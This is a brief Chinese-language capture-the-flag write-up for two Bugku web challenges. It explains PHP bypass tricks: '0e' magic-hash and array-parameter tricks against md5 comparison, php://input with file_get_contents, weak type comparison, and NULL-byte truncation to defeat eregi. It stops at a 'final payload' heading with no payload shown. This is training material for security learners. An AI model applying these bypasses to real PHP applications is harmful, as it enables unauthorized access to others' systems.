web16-备份文件，php 特性

  • 扫后台，得到备份文件，打开后是代码审计绕过
  • parse_str()函数把查询字符串解析到变量中。
  • 注意这里if(md5($key1) == md5($key2) && $key1 !== $key2)语句的绕过
    • 方法一：md5 冲撞，这里 md5 函数会返回 32 位的字符串，PHP 特性：如果字符串开头0e开头，类型转换会识别为一个科学计数法表示的0,即可绕过
    • 方法二：如果把==换成===,则法一不成立，需要用key1[]=1&key2[]=2,即可绕过。。

web21

  • F12 源码出看到1p.html,访问后，在 bp 抓包的到 response 内容
  • 经过解码后,得到源码
  • 三处绕过
    • $data = @file_get_contents($a,'r')要等于”bugku is a nice plateform!”
    • ==弱类型比较
    • eregi 函数的绕过:截断漏洞
  • 1.伪协议
    writeup 的思路是利用伪协议 php://input
    该伪协议可以访问请求的原始数据的只读流，通俗点说就是可以获取 post 报文的实体体(body)的内容
    file_get_contents()是用来将文件的内容读入到一个字符串中的首选方法
  • 2.弱命令比较
    0e123456以 0e 开头字符串，php 会解析成科学计数法表示的 0，或者直接让 id=adc，比较时abc==0,即为false==0 成立
  • 3.eregi 函数的绕过:截断漏洞
    eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
    NULL 字符截断是最有名的截断漏洞之一。
    PHP 内核是 C 语言，用了 C 的一些字符串处理函数，因而遇到 NULL(\x00)字符的时候，处理函数就会把它当作结束标记。
    在 eregi 函数看来 $b 其实为空字符串‘’，因为把%00(\x00)当作结束符了
    所以字符匹配模式为‘111’ ,’1114’与之匹配 而首字符为%而不是 4
    利用 null 截断漏洞成功绕过 eregi()函数
  • 最终 payload
